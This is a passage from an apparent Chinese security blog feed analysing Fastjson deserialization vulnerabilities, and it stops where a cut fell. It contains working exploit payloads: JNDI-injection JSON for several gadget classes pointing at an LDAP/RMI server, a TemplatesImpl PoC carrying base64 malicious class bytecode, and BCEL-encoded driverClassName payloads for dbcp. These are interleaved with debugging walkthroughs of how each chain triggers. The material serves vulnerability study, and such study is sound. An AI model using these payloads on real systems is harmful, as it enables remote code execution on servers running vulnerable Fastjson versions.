class="token punctuation">,</span><span class="token property">"java.naming.factory.initial"</span><span class="token operator">:</span><span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">,</span><span class="token property">"topic-factory"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">"namespace"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">}</span></code></pre><h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：<br><strong>JSON</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"metricRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span>或<span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"healthCheckRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span></code></pre><p>com.caucho.config.types.ResourceRef类PoC：<br><strong>JSON</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.caucho.config.types.ResourceRef"</span><span class="token punctuation">,</span><span class="token property">"lookupName"</span><span class="token operator">:</span> <span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span> <span class="token property">"value"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.value"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="未知版本"><a href="#未知版本" class="headerlink" title="未知版本"></a>未知版本</h3><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：<br><strong>JSON</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory"</span><span class="token punctuation">,</span> <span class="token property">"tmJndiName"</span><span class="token operator">:</span> <span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span> <span class="token property">"tmFromJndi"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token property">"transactionManager"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.transactionManager"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：<br><strong>JSON</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory"</span><span class="token punctuation">,</span> <span class="token property">"tmJndiName"</span><span class="token operator">:</span> <span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span> <span class="token property">"tmFromJndi"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token property">"transactionManager"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.transactionManager"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.anquanke.com/post/id/232774">浅析Fastjson1.2.62-1.2.68反序列化漏洞-安全客 - 安全资讯平台</a><br><a href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02-1-2-62-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02-1-2-62-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="各个版本的payload"><a href="#各个版本的payload" class="headerlink" title="各个版本的payload"></a>各个版本的payload</h2><ul><li><a href="https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md">FastJsonParty/Fastjson全版本检测及利用-Poc.md at main · lemono0/FastJsonParty</a></li><li><a href="https://github.com/safe6Sec/Fastjson">GitHub - safe6Sec/Fastjson: Fastjson姿势技巧集合</a></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog</a></li><li><a href="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Bypass/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType.md">https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Bypass/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType.md</a></li><li><a href="https://goodapple.top/archives/832">Java安全学习——Fastjson反序列化漏洞 - 枫のBlog</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson1.2.24反序列化漏洞</title>
      <link href="/2024/04/26/fastjson1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/04/26/fastjson1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson1-2-24反序列化漏洞"><a href="#fastjson1-2-24反序列化漏洞" class="headerlink" title="fastjson1.2.24反序列化漏洞"></a>fastjson1.2.24反序列化漏洞</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Fastjson 1.2.x系列的1.2.22-1.2.24版本。</p><h2 id="TemplateImpl的利用链"><a href="#TemplateImpl的利用链" class="headerlink" title="TemplateImpl的利用链"></a>TemplateImpl的利用链</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞： JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</li><li>服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField)</li></ol><p>流程<br><img src="/img/4-26/1.png"></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> evilCode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span><span class="token class-name">Calc</span><span class="token punctuation">.</span><span class="token function">getCodeByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>                      <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">+</span> <span class="token string">"\",\"_bytecodes\":[\""</span> <span class="token operator">+</span> evilCode <span class="token operator">+</span> <span class="token string">"\"],'name':'yyjccc','_tfactory':{ },\"_outputProperties\":{ },"</span><span class="token punctuation">;</span>                      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"yv66vgAAADQAGQEABll5amNjYwcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAoACwoACQAMAQAEY2FsYwgADgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABAAEQoACQASAQAGPGluaXQ+DAAUAAYKAAQAFQEAClNvdXJjZUZpbGUBAAtZeWpjY2MuamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAWAAIAAAAAAAq4AA0SD7YAE1exAAAAAAABABQABgABAAcAAAARAAEAAQAAAAUqtwAWsQAAAAAAAQAXAAAAAgAY"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"yyjccc"</span><span class="token punctuation">,</span><span class="token property">"_tfactory"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>测试代码：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span><span class="token class-name">FastjsonExp</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">Calc</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>binary<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token comment">// TemplatesImpl 链子的 EXP</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesImplPoc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> evilCode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span><span class="token class-name">Calc</span><span class="token punctuation">.</span><span class="token function">getCodeByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">+</span> <span class="token string">"\",\n\"_bytecodes\":[\""</span> <span class="token operator">+</span> evilCode <span class="token operator">+</span> <span class="token string">"\"],\n\"_name\":\"yyjccc\",\n\"_tfactory\":{ },\n\"_outputProperties\":{ }\n}"</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>设置允许设置私有属性<br>设置Feature.SupportNonPublicField</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>因为设置支持私有属性，所以能够直接反射赋值</p><ol><li>_bytecodes数据的base64解码</li></ol><p>在读取_bytecodes属性的时候，应为_bytecodes属性为Class数组<br>会走进ObjectArrayCodec类中deserialze方法中<br><img src="/img/4-26/2.png"><br>继续跟进<br><img src="/img/4-26/3.png"><br>在JSONScaner中的bytesValue对数据进行base64解码<br><img src="/img/4-26/4.png"></p><ol start="2"><li>. this.sortedFieldDeserializers和this.extraFieldDeserializers两组List区别<br>FieldDeserializers 是存放了各个属性的反序列化器，其中主要属性和方法：</li></ol><ul><li>fieldInfo存放属性名，属性getter/setter，Field对象等信息；</li><li>clazz 存放属性所属类的Class对象</li><li>parseField() 根据fieldType获取对应的fieldValueDeserilizer完成对属性值的反序列化 和 赋值操作</li></ul><ol><li><strong>this.sortedFieldDeserializers</strong>sortedFieldDeserializers存放的属性主要来源于beanInfo，<strong>在beanInfo的build方法中会将setter/getter符合条件的FieldInfo增加到beanInfo.sortedFields中。</strong>其中的FieldInfo都包含了Method对象，最终都通过Method.invoke()进行赋值；</li><li><strong>this.extraFieldDeserializers</strong></li></ol><p>extraFieldDeserializers 会将getDeclaredFields 符合修饰符条件的Field增加进去。<br>FieldInfo Method对象为空，最终都通过Field.set()进行赋值；</p><p>除去_outputProperties前面的_<br>在JavaBeanDeserializer#smartMatch中处理<br><img src="/img/4-26/5.png"><br>当没有获取到deserializer的时候<br>处理属性名除去_<br><img src="/img/4-26/6.png"></p><p>到最后操作_outputProperties的时候触发链子<br>触发到达TemplateImpl#getOutputProperties中<br><img src="/img/4-26/7.png"><br>往下就是非常常见的TemplatesImpl字节码加载的触发链<br>跟进newTransformer中<br><img src="/img/4-26/8.png"><br>跟进getTransletInstance中<br><img src="/img/4-26/9.png"><br>_name属性不能为null,否则提前退出<br>进入defineTransletClasses()<br>创建了一个类加载器，然后如下循环加载_bytecodes中的字符数组<br><img src="/img/4-26/10.png"><br>加载后会检查加载的类是否是继承于com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<br>因此加载的恶意类需要设置父类：AbstractTranslet</p><h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ul><li>fastjson版本&lt;=1.2.24</li><li>机器能出网，能够打jndi</li></ul><p>流程</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">BaseRowSet</span>#setDataSourceName<span class="token class-name">JdbcRowSetImpl</span>#setAutoCommit<span class="token operator">-&gt;</span><span class="token class-name">JdbcRowSetImpl</span>#connect<span class="token operator">-&gt;</span><span class="token class-name">JdbcRowSetImpl</span>#getDataSourceName<span class="token function">lookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"DataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:8085/YjQUxZVf"</span><span class="token punctuation">,</span><span class="token property">"AutoCommit"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">}</span></code></pre><p>测试代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> jndiAddress<span class="token operator">=</span><span class="token string">"rmi://127.0.0.1:8085/YjQUxZVf"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> data<span class="token operator">=</span><span class="token string">"{\n\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\"DataSourceName\":\""</span><span class="token operator">+</span>jndiAddress<span class="token operator">+</span><span class="token string">"\",\n\"AutoCommit\":false\n}"</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//JSON.parse(data);</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="调式"><a href="#调式" class="headerlink" title="调式"></a>调式</h3><p>在设置AutoCommit属性的时候触发链子<br>JdbcRowSetImpl#setAutoCommit方法中<br><img src="/img/4-26/11.png"><br>跟进connect方法<br><img src="/img/4-26/12.png"><br>这里直接初始化了JNDI上下文环境，使用lookup查询DataSourceName<br>因此可以设置DataSourceName的值打jndi</p><h2 id="Bcel字节码加载攻击链"><a href="#Bcel字节码加载攻击链" class="headerlink" title="Bcel字节码加载攻击链"></a>Bcel字节码加载攻击链</h2><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h3><ul><li>需要有如下commons-dbcp依赖或者tomc-dbcp依赖</li><li>fastjson&lt;=1.2.36</li><li>jdk&lt;8u251</li></ul><p>特殊点: com.sun.org.apache.bcel是位于原生的JDK中的:<br>BCEL Classloader在 JDK &lt; 8u251之前是在rt.jar里面。</p><ol><li>自定义使用加载类的Classloader为com.sun.org.apache.bcel.internal.util.ClassLoader</li><li>自定义指定Classloader加载的类名</li></ol><h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><ol><li>commons-dbcp<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-dbcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-dbcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre>po</li></ol><p>流程</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">BasicDataSource</span>#<span class="token function">setDriverClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">BasicDataSource</span>#<span class="token function">setDriverClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">BasicDataSource</span>#<span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token class-name">BasicDataSource</span>#<span class="token function">createDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token class-name">BasicDataSource</span>#<span class="token function">createConnectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ol start="2"><li>tomcat-dbcp<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>tomcat-dbcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>9.0.65<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre>poc<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span><span class="token property">"driverClassName"</span><span class="token operator">:</span><span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$8f$cdJ$c3P$Q$85$cf$f4$t$89$b7Q$9bj$ab$$$5d$99$ba$b0$hw$zn$EW$82bAq$Z$c7K$b8$n$s$90$de$W$7d$y7$w$$$7c$A$lJ$9c$h$x$W$9c$cd$cca$ce$7c$9c$f9$fcz$ff$Ap$8c$3d$82w$fb$941$b3$P$ot$b3d$91$8c$f2$a4HG$Xw$99f$eb$a3I$I$s$9c$9b$c2$d8$TB3$k$5e$TZ$a7$e5$bd$sD$7f$ee$abya$cd$83$f6$R$QT$aa$edR$T$fa$f1$f0$fc$9fm$iB$a1$a3$b0$86P$60$9c$e4$i$60C$s$fd$a8$99p$Q$af$5cLme$8at$bc$K$b9$acJ$d6$b3$99$40$ba$88$i$a4$tOL$ea$80$n$b6$e1$v$b4$d0$97$Y$d3r$5e$b1$3e3$b9$c4$e8$fc$3cy$e4$u$d8GC$y$ae$g$I$d0$86$H$82$_j$m$da$95z$c3zo$f3$F$5b7$cf$b5$sG$5dz$o$e9$q$bd$7d$f8$8a$c1$efz$a7F$ed$7e$D$3c$n8iV$B$A$A"</span><span class="token punctuation">,</span><span class="token property">"driverClassLoader"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ol><ul><li><strong>tomcat7</strong>:</li></ul><p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><ul><li><strong>tomcat8</strong>及其以后:</li></ul><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource<br>流程</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">BasicDataSource</span>#<span class="token function">setDriverClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">BasicDataSource</span>#<span class="token function">setDriverClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">BasicDataSource</span>#<span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token class-name">BasicDataSource</span>#<span class="token function">createDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token class-name">BasicDataSource</span>#<span class="token function">createConnectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token class-name">DriverFactory</span>#<span class="token function">createDrive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>c</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.dbcp.BasicDataSource"</span><span class="token punctuation">,</span>  <span class="token property">"driverClassName"</span><span class="token operator">:</span><span class="token 